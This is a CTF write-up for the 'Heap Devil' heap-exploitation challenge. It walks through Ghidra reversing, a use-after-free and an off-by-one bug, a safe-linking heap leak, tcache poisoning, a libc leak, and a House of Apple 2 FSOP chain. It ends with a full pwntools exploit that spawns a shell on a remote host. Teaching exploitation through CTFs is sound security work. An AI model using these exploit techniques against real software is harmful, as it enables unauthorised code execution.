---
title: "LYKNCTF: Heap Devil Writeup"
date: 2026-07-08
categories: 
  - "reverse-engineering"
  - "pwn"
tags: 
  - "pwn"
  - "ctf"
  - "lyknctf"
  - "binary exploitation"
  - "reverse-engineering"
---

I had another heap pwn challenge to tackle for this week's writeup. I decided to give it a go during LYKNCTF which was branded as beginner friendly CTF, but I ended up spending hours trying to solve it. It was a fun challenge regardless and helped me practice FSOP techniques in pwn.college I recently studied. 

## Initial Look

Running the binary, gives us a heap menu. Classic heap menu challenge where we can create, edit, read, delete heap chunks and also an additional option for changing size?, that is interesting it is something new. 

Looking at the file, it has all protections enabled, nothing of a surprise. We will need to some leaking definitely. Next step is decompiling using Ghidra and see if we can spot obvious bugs and issues. At this point, I want to point something cool I did for the ghidra output to make it more readable. Normally this is how it looks:

![Before clearing](/assets/img/heapdevil_ghbefore.png)

And how it looks after I declared structs, labelled stuff, changed types: 

![After clearing](/assets/img/heapdevil_ghafter.png)

It is much clean, easy to read and understand than first version! I think this is the first I spent this much time on clearing a ctf binary decompilation, but honestly it made it much easier to follow for myself. So if you are like me, and don't care about the first blood; go and define structs, redefine and retype variables to make the decompilation easy to read. For this challenge, most of the improvements in readability came from defining the Note struct by observing the decompiled code and reversing what each field is supposed to represent:

![Note structure](/assets/img/heapdevil_note.png)

In summary, we can allocate a heap chunk by creating notes. Created notes are stored globally in an array where each element holds a Note structure. Note structure holds a few important information: 

* isSet -> Is that Note is allocated
* size  -> Allocated size of chunk - this is used in few options.
* ind   -> Index
* And of course finally heap pointer.

Compared to some other heap menu challenges I looked at, this one stores an array of structures instead of array of heap pointers. Still the same concept, just an extra step to understand.

### Bugs

Once I cleaned the decompiled code, it made it easier to read and understand. Easier doesn't mean easy though! Finding the initial bugs took me quite longer than I'd have wanted. Normally in other heap menu challenges, finding Use-After-Free(UAF) was pretty straightforward, call delete and then freed pointer can still be used. This one however has a different delete logic by shifting entries:

```C++
    free((void *)notes[ind].heapPointer);
    if (num_notes + -1 != ind) {
        for (i = ind; i < num_notes + -1; i = i + 1) {
        next = i + 1;
        cur = (long)i;
        nextSz = notes[next].size;
        nextInd = notes[next].ind;
        uVar1 = *(undefined4 *)&notes[next].field_0xc;
        notes[cur].isSet = notes[next].isSet;
        notes[cur].size = nextSz;
        notes[cur].ind = nextInd;
        *(undefined4 *)&notes[cur].field_0xc = uVar1;
        notes[cur].heapPointer = notes[next].heapPointer;
        }
    }
```

When a note is deleted, following notes after that gets shifted down, so deleted note's heapPointer is overwritten by the next note's heapPointer. Then how can we get a UAF to do the cool hacking stuff? There is a catch here: `num_notes + -1 != ind` this global variable tracks the total number of notes created. For example if there are 5 notes and if we try to delete the 4th, last note, this check `4 != 4` returns false and shifting logic isn't applied, since there is nothing to shift after the last index. **This is the first major bug: `UAF of last note`** 

Now moving onto the second major bug. `num_notes` track the available notes to check against out of bound accesses. Looking at boundary checks, I noticed two different implementation:

```cpp
// In edit and view note:
if (((iVar1 == 1) && (-1 < ind)) && (ind <= num_notes)

// In other options:
if (((next == 1) && (-1 < ind)) && (ind < num_notes))
```

**In edit and view note we can access one more than intended note- OOB access!** Normally when a note is deleted, `num_notes` is updated so user can only access 0:num_notes indexed entries. But with this bug and previous combined:

1. Delete last note so its heap pointer isn't overwritten by shift
2. OOB EDIT/READ of last note's heap pointer!

So we can now do whole bunch of cool stuff!

### File Pointer

While looking at the code and heap chunks in debugging I noticed there is a file pointer created for no reason: `fp = fopen("/dev/random","r");` this is very arbitrary and it doesn't seem to be used in the rest of the code. This indicates we need to do `FSOP` , I will discuss this further in the solution part. For now, let's keep in mind that there is a file struct available in heap memory.  

### Unknowns

Now we know the tools/bugs given to us for exploitation. What do we need to reach code execution:

1. Heap base, that will help us understand where our chunks are. 
2. Libc base, system and other useful stuff is there for FSOP
3. Arbitrary read and write primitive
4. PIE base if we want to directly modify notes array - I didn't need it.

## Solution

Since this is a heap menu challenge, it is always nice to have some helper functions to navigate the menu:

```python
def create_note(size: int, data: bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(size).encode())
    io.sendlineafter(b': ', data)


def view_note(ind: int):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(ind).encode())

    io.readuntil(b': ')

    return io.recvline()

def edit_note(ind: int, data: bytes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(ind).encode())
    io.sendlineafter(b': ', data)


def del_note(ind: int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(ind).encode())
```

Let's now focus on the solution. Going by the unknowns, we will need heap base and libc base leakage.

### Leak Heap

When you have UAF on a chunk that you can read, leaking heap is quite simple. This challenge uses up to 256 bytes allocations so when these chunks are freed they will end up in tcache and freed memory will contain forward pointers to other chunks in the tcache bin's linked list. Since there is no other free chunk to point to, it will point to heap base itself. Note that **libc version of the challenge mangles fd pointer** But mangling logic actually isn't hard to reverse in this instance due to heap base always starting wit 0x000 nibbles:

```python
def heap_leak():
    # We need at least one in array before deleting the last one
    create_note(256, b'')
    create_note(256, b'')
    del_note(1)
    leak = view_note(1)

    # First 8 bytes will be mangled FD pointer, shifting by 12 will give the heap base
    fd = u64(leak[:8]) << 12

    print(f'HEAP BASE: {hex(fd)}')

    return fd
```

I needed to use an extra initial note to be able to use the UAF and OOB bugs I discussed earlier. In simple terms, allocate the notes and delete the last one which will keep its pointer and values intact. Then read last note to leak the modified contents of the freed heap chunk. That chunk will contain the mangled fd pointer which points to 0x00000000 but due to way mangling works we can get heap base from it:

```
fd = NEXT_ADDR ^ (CHUNK_ADDR >> 12)

// Next is 0, since it is the only chunk. And shifting by 12 bits/ 3 nibbles just removes the 3 nibbles
fd = CHUNK_ADDR >> 12

// Since this chunk is close to heap base, essentially we can get heap base by reversing it
heap_Base = fd << 12
```

### Tcache Bin Attack

Did you notice we can only read the last chunk's contents and there is no way to read or write other pointer yet. We don't have arbitrary read or write with the bugs we have found. What we have is a tcache bin that we can read and write to. This gives us the ability to do `Tcache bin attack or Tcache poisoning` whatever you want to call it. This attack elevates our simple bug to arbitrary read and write. Let's first look at the implementation:

```python
def tcache_bin_attack(heap_base: int):
    create_note(256, b'')
    create_note(256, b'')
    del_note(1)
    del_note(1)

    fp_base    = heap_base + 0x2a0
    chunk_addr = heap_base + 0x690
    mangled_p  = fp_base ^ (chunk_addr >> 12)

    print(f'NEW_FP: {hex(mangled_p)}')

    edit_note(1, p64(mangled_p))

    # Firs allocation consumes both free chunks
    create_note(256, b'')

    # Second allocation returns the target address pointer by malloc
    create_note(256, b'')
```

Since we can read and edit the last note's heap pointer, we can only read what that pointer points to. Tcache bin attack's purpose is to deceive malloc to return a pointer to any address we want by modifying fd pointer. In summary:

1. Allocate two chunks A and B that will use same tcache bin. One tcache bin linked list can store up to 7 freed chunks.
2. Free both of the chunks, A and B.
3. When freed we get fd pointers pointing like: B -> A -> heap_base . And they are mangled pointers of course.
4. We have write and read access to B's chunk so we can change fd value to target something else
5. Allocate twice: once to consume B, and second time to get malloc return a n

After two free we can see the chunks here in this picture, pointers are mangled but still A's pointer is easy to distinguish since it roughly points to heap base. 

![heapdevil_tcache](/assets/img/heapdevil_tcache.png)

Following this, after the first allocation something interesting happens, two of the free heap chunks they are not in tcache anymore:

![Tcache bin](/assets/img/heapdevil_allocate1.png)

I don't exactly know how it happens, or maybe it could be heap analyzer of pwndbg thinking it is allocated due to pointers etc. Let's just say heap is a `wibbly wobbly timey wimey stuff` and move one. And following the second allocation last note should contain pointer to the target address:

![Success](/assets/img/heapdevil_allocate2.png)

With this attack we managed to get malloc to return target address for us: Allocated file struct's heap chunk. Why did we pick this target? I think it makes it a bit easier to do the FSOP exploitation. It is already allocated and stored in memory, we can read from it to leak stuff, write to it to execute code. Now since we got that pointer stored in the last note, we should be able to read it and write it anytime freely.

### Leaking Libc

I initially spent considerable time on this to leak libc using `unsorted bin`. But it doesn't work! When we fill a tcache bin linked list by 7 free, 8th free bin will go to unsorted bin. However, since we can only read from last note using UAF, last free goes to consolidation! I couldn't find a way to get a unsorted bin with a guard buffer and then read from it. Dead end!

But there is a much easier way now! Since we can read the allocated file struct by following the previous attack, leaking libc is quite easy:

```python
def leak_libc():
    # This should show FP contents! Now Note2 can be used to modify FP and do FSOP
    fp_bytes = view_note(2)
    print(f'{fp_bytes.hex()}')

    # This points to _IO_file_jumps
    vtable = u64(fp_bytes[216:224])

    libc_base = vtable - (libc.sym._IO_file_jumps)
    libc.address = libc_base

    print(f'LIBC: {hex(libc_base)}')

    return libc_base
```

That file's vtable points to _IO_file_jumps, easy symbol to read from the provided libc. We just read the file struct's contents and then boom you get libc base.

### House of Apple 2

Final part of the puzzle, getting code execution with FSOP. If you are reading this, and reached this point, well thank you for your time firstly :D And secondly, if you are still learning how to do FSOP stuff like me, I highly would recommend pwn.college's file struct challenges, they are great to learn FSOP.

House of Apple 2 utilizes the cleanup routine of file structs after exit is called. This is a modern way of dealing vtable checks introduced in libc 2.35 or something around that. In this challenge, that file isn't being used so we follow the cleanup routine call chain:

```
exit() 
 └── fcloseall() (or internal glibc cleanup)
      └── _IO_cleanup()
           └── _IO_flush_all_lockp()
                └── _IO_wfile_overflow()  <-- Redirected here via forged vtable
                     └── _IO_wdoallocbuf()
                          └── ((_IO_wide_data *)->_wide_vtable->__doallocate)() <-- Hijack point
```

A few critical things we need to do to achieve this chain of calls:

1. File structure's vtable should point to `_IO_wfile_jumps` instead of `_IO_file_jumps`. 

2. Since we are using  `_IO_wfile_jumps`, we need to create `_wide_data` structure and store it somewhere that we can point to.

3. Meet condition to trigger `_IO_wfile_overflow` -> `fp's _IO_write_ptr should be bigger than _IO_write_base`

4. Once `_IO_wfile_overflow` is triggered, `((_IO_wide_data *)->_wide_vtable->__doallocate)()` is called. So we need to override wide_data's vtable's __doallocate function pointer to our target function, like `system`

5. If you want to provide `sh` as a parameter to system call, make sure it is padded with two empty spaces: `  sh` to set fp's flags properly. Otherwise you won't hit most of the points discussed above.

I think that is about it. By following these points I created wide data structure and modified fp contents. I was using 256 bytes size for the allocation, but that is not enough to store both wide data and fp structures. **I think update option in the menu could be used here to upgrade a slot to 512 size maybe?** But I didn't use that option, instead I stored wide data in one of the notes and found its offset to heap base to point fp's wide data pointer to it. It felt easier this way for some reason:

```python
def fsop(heap_base: int):
    note1_adr  = heap_base + 0x6a0
    fp_base    = heap_base + 0x2a0

    # This will get stored in note1 chunk. fake vtable is integrated inside
    # This is a trick I learned in pwn.college. Since only the referenced parts
    # are important, we can combine the vtable and wdata itself, as long as they
    # are referring to right offsets
    fake_wdata = flat({
        0x00: 0,                         # _IO_read_ptr
        0x18: 0,                         # _IO_write_base == NULL  -> _IO_wdoallocbuf path
        0x30: 0,                         # _IO_buf_base   == NULL  -> _IO_WDOALLOCATE        
        0x68: libc.sym.system,           # Overwriting __doallocate slot in fake wide vtable
        0xe0: note1_adr,                 # _wide_vtable pointer offset = beginning of wdata
    }, filler=b'\x00')    

    # Size of this is 0xE0 and we send wide_data right after it
    fp = FileStructure()
    fp.flags = b'  sh'
    fp._IO_write_base = 0
    fp._IO_write_ptr  = 1                        # _IO_write_ptr  (> write_base => OVERFLOW fires)   
    fp._lock      = fp_base + 200                # This should be null I think?
    fp._wide_data = note1_adr                    # Stored in another chunk
    fp.vtable     = libc.sym._IO_wfile_jumps

    # Now store wdata in notes1 and fake file in the FP's original place
    edit_note(1, fake_wdata)
    edit_note(2, bytes(fp))
```

Once the file structure is updated and wide data is stored. Next step is just to call exit option and let the exit cleanup chain do its thing and give us a shell!

## Final Solution

Here you can find the combined solution script for reference:

```python
from pwn import *

exe  = './Heap_devil'
elf  = ELF(exe)
libc = ELF('./libc.so.6')

context.binary = elf
# context.log_level = 'debug'
# context.aslr = False

context.terminal = ['cmd.exe', '/c', 'start', 'wsl.exe', '-d', 'Ubuntu']


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        p = remote('15.235.202.47', 9009)
        return p
    else:
        return process([exe] + argv, *a, **kw)

def create_note(size: int, data: bytes):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(size).encode())
    io.sendlineafter(b': ', data)


def view_note(ind: int):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(ind).encode())

    io.readuntil(b': ')

    return io.recvline()

def edit_note(ind: int, data: bytes):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(ind).encode())
    io.sendlineafter(b': ', data)


def del_note(ind: int):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b': ', str(ind).encode())


def heap_leak():
    # We need at least one in array before deleting the last one
    create_note(256, b'')
    create_note(256, b'')
    del_note(1)
    leak = view_note(1)

    # First 8 bytes will be mangled FD pointer, shifting by 12 will give the heap base
    fd = u64(leak[:8]) << 12

    print(f'HEAP BASE: {hex(fd)}')

    return fd



def tcache_bin_attack(heap_base: int):
    create_note(256, b'')
    create_note(256, b'')
    del_note(1)
    del_note(1)

    # We want to target FP stored in the heap to read and write to it. That fp is stored 
    # at chunk base = heap_base + 0x2a0
    # To overwrite the stored fd pointer, we need to mangle it:
    #   fake_next = target ^ (victim_chunk_addr >> 12)
    # From debugging and using fixed sizes, we know where our chunk is:
    fp_base    = heap_base + 0x2a0
    chunk_addr = heap_base + 0x690
    mangled_p  = fp_base ^ (chunk_addr >> 12)

    print(f'NEW_FP: {hex(mangled_p)}')

    edit_note(1, p64(mangled_p))

    create_note(256, b'')
    create_note(256, b'')


def leak_libc():
    # This should show FP contents! Now Note2 can be used to modify FP and do FSOP
    fp_bytes = view_note(2)
    print(f'{fp_bytes.hex()}')

    # This points to _IO_file_jumps
    vtable = u64(fp_bytes[216:224])

    libc_base = vtable - (libc.sym._IO_file_jumps)
    libc.address = libc_base

    print(f'LIBC: {hex(libc_base)}')

    return libc_base

def fsop(heap_base: int):
    note1_adr  = heap_base + 0x6a0
    fp_base    = heap_base + 0x2a0

    # This will get stored in note1 chunk. fake vtable is integrated inside
    # This is a trick I learned in pwn.college. Since only the referenced parts
    # are important, we can combine the vtable and wdata itself, as long as they
    # are referring to right offsets
    fake_wdata = flat({
        0x00: 0,                         # _IO_read_ptr
        0x18: 0,                         # _IO_write_base == NULL  -> _IO_wdoallocbuf path
        0x30: 0,                         # _IO_buf_base   == NULL  -> _IO_WDOALLOCATE        
        0x68: libc.sym.system,           # Overwriting __doallocate slot in fake wide vtable
        0xe0: note1_adr,                 # _wide_vtable pointer offset = beginning of wdata
    }, filler=b'\x00')    

    # Size of this is 0xE0 and we send wide_data right after it
    fp = FileStructure()
    fp.flags = b'  sh'
    fp._IO_write_base = 0
    fp._IO_write_ptr  = 1                        # _IO_write_ptr  (> write_base => OVERFLOW fires)   
    fp._lock      = fp_base + 200                # This should be null I think?
    fp._wide_data = note1_adr                    # Stored in another chunk
    fp.vtable     = libc.sym._IO_wfile_jumps

    # Now store wdata in notes1 and fake file in the FP's original place
    edit_note(1, fake_wdata)
    edit_note(2, bytes(fp))

    view_note(2)


gdbscript = """
b *main+264
c
""".format(**locals())

io = start()

heap_base = heap_leak()
tcache_bin_attack(heap_base)
libc_base = leak_libc()
fsop(heap_base)

# Exit and get the shell
io.sendlineafter(b'> ', b'6')
io.interactive()
```

Overall quite a fun and informative challenge. It was also a good coincidence that I was working on file struct exploits in pwn.college. I am happy that I managed to get FSOP right without looking it up this time, yippee. 

As always, keep learning!